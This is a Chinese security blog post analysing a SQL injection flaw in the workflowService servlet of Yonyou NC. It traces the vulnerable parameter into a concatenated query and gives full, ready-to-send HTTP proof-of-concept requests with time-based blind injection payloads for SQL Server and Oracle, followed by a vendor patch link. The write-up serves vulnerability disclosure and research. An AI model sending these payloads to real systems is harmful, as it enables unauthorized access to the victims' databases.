#  用友NC workflowService SQL注入1day代码分析   
原创 island  深白网安   2024-12-04 09:17  
  
# 免责声明：文章中内容来源于互联网，涉及的所有内容仅供安全研究与教学之用，读者将其信息做其他用途而造成的任何直接或者间接的后果及损失由用户承担全部法律及连带责任。文章作者不承担任何法律及连带责任！如有侵权烦请告知，我们会立即删除整改并向您致以歉意。  
#   
# 0x00.漏洞描述  
# 用友NC存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感数据  
#   
# 0x01.漏洞分析  
```
home/modules/webimp/lib/pubwebimp_cpwfmLevel-1/nc/uap/wfm/action/WorkflowService.java
```  
  
该类下的doPost方法接收proDefPk参数并传入WfmXmlUtil.getWfmXmlByPk  
  
![](https://mmbiz.qpic.cn/mmbiz_png/uY5HnRPFudicwhnUx8XLSLpr1x2JPOO0j5TvFIr6xzHDSdw521licMuN5aElPWweJBadSrkibUyjaEM0iazyOCeMDA/640?wx_fmt=png&from=appmsg "")  
  
WfmXmlUtil.getWfmXmlByPk定义如下，将参数传给IWfmProDefQry.getProDefVOByProDefPk  
  
![](https://mmbiz.qpic.cn/mmbiz_png/uY5HnRPFudicwhnUx8XLSLpr1x2JPOO0jBAdSwghBZA2ewPzJJZtaIicMBx9PJ4Gqm0PkSRPygFoj0B2yc1o5HvQ/640?wx_fmt=png&from=appmsg "")  
  
WfmProDefQry.为IWfmProDefQry接口的实现类，其对应的getProDefVOByProDefPk方法实现如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/uY5HnRPFudicwhnUx8XLSLpr1x2JPOO0jxd7ibfmH0xnibr3tkAx1Qttkx01sDDC13zOiagDh7bApSCytkXQf8NCeg/640?wx_fmt=png&from=appmsg "")  
  
这里直接将参数拼接进sql语句产生sql注入  
  
0x02.漏洞复现  
  
分为两种数据库两种poc注入验证  
  
sqlserve  
```
GET /portal/pt/servlet/workflowService/doPost?pageId=login&proDefPk=1'waitfor+delay+'0:0:5'-- HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: keep-alive
Accept-Encoding: gzip, deflate
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Cookie: JSESSIONID=3F221B907A99FE29F8B545440F233F25.server
Upgrade-Insecure-Requests: 1
```  
  
  
**Oracle**  
  
****```
GET /portal/pt/servlet/workflowService/doPost?pageId=login&proDefPk=1'+AND+1=DBMS_PIPE.RECEIVE_MESSAGE(1,5)-- HTTP/1.1
Host:
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: keep-alive
Accept-Encoding: gzip, deflate
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Cookie: JSESSIONID=3F221B907A99FE29F8B545440F233F25.server
Upgrade-Insecure-Requests: 1
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/uY5HnRPFudicwhnUx8XLSLpr1x2JPOO0jC3VawspK2oicT0XC3ekyd56V8PSpPsicVLyHSFb59agyCUy3KPicIeATA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/uY5HnRPFudicwhnUx8XLSLpr1x2JPOO0jCfiaahB5eicU9j6pxtciaxueibNrpzvlOkGZMaVorOibWRictW6cEmCuT9Tw/640?wx_fmt=png&from=appmsg "")  
# 0x03.修复建议  
# 厂商已提供漏洞修补方案，请关注厂商主页及时更新  
# https://security.yonyou.com/#/noticeInfo?id=540  
#   
# 免责声明：文章来源互联网收集整理，请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
  
